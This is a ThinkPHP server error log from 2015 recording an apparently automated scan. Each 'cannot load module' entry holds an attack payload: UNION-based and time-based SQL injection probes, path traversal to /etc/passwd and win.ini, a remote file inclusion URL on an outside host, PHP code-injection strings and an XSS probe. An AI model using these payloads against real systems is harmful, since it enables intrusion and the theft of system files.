[ 2015-09-23T17:14:40+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:41+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T17:14:41+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T17:14:42+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T17:14:43+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:43+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:44+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:44+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:45+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:46+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T17:14:46+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T17:14:47+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T17:14:47+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T17:14:48+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:48+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:49+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:50+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:50+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:51+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:51+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T17:14:52+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T17:14:53+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T17:14:53+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T17:14:54+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T17:14:54+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:55+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:56+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:56+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:57+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:57+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:58+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:58+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T17:14:59+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:00+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:00+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T17:15:01+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T17:15:01+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T17:15:02+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:03+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:03+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:04+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:04+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:05+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:06+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:06+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:07+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:07+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:08+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:08+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:09+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T17:15:10+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T17:15:10+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T17:15:11+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:11+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:12+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:13+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:13+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:14+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:14+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:15+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:16+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:16+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:17+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:17+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:18+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:19+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:19+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T17:15:20+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T17:15:20+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T17:15:21+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:22+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:22+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:23+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:23+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:24+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:24+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:25+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:26+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:26+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:27+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:27+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:28+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:29+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:29+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:30+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T17:15:30+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T17:15:31+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T17:15:32+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T17:15:32+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:33+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:33+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:34+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:35+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:35+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:36+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:36+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:37+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:37+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:38+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:15:39+08:00 ] ERR: (ThinkException) 无法加载模块Deal AND SLEEP(5)
[ 2015-09-23T17:15:39+08:00 ] ERR: (ThinkException) 无法加载模块Deal AND SLEEP(5) #
[ 2015-09-23T17:15:40+08:00 ] ERR: (ThinkException) 无法加载模块Deal; SELECT PG_SLEEP(5)--
[ 2015-09-23T17:15:40+08:00 ] ERR: (ThinkException) 无法加载模块Deal; SELECT SLEEP(5)-- 
[ 2015-09-23T17:15:41+08:00 ] ERR: (ThinkException) 无法加载模块Deal'; SELECT SLEEP(5)-- 
[ 2015-09-23T17:15:42+08:00 ] ERR: (ThinkException) 无法加载模块Deal) AND SLEEP(5) #
[ 2015-09-23T17:15:42+08:00 ] ERR: (ThinkException) 无法加载模块Deal'; SELECT SLEEP(5)--
[ 2015-09-23T17:15:43+08:00 ] ERR: (ThinkException) 无法加载模块Deal WAITFOR DELAY '0:0:5'--
[ 2015-09-23T17:21:14+08:00 ] ERR: (ThinkException) 无法加载模块/etc/passwd
[ 2015-09-23T17:22:27+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../etc/passwd
[ 2015-09-23T17:23:32+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../etc/passwd .jpg
[ 2015-09-23T17:24:03+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../../../etc/passwd%00
[ 2015-09-23T17:24:48+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../windows/win.ini
[ 2015-09-23T17:25:19+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../windows/win.ini .jpg
[ 2015-09-23T17:25:34+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-23T17:25:50+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-23T17:26:00+08:00 ] ERR: (ThinkException) 无法加载模块a_long_name_file_not_exist
[ 2015-09-23T17:26:39+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}
[ 2015-09-23T17:26:55+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}\
[ 2015-09-23T17:27:06+08:00 ] ERR: (ThinkException) 无法加载模块print(md5(this_is_a_test_string));die();/*
[ 2015-09-23T17:27:16+08:00 ] ERR: (ThinkException) 无法加载模块'"><scRipt>alert(98733)</sCript>
[ 2015-09-23T21:22:15+08:00 ] ERR: (ThinkException) 无法加载模块Deal,'"([.)).)
[ 2015-09-23T21:22:18+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:19+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:19+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T21:22:20+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:21+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:21+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:22+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T21:22:22+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T21:22:23+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:23+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:24+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:24+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T21:22:25+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
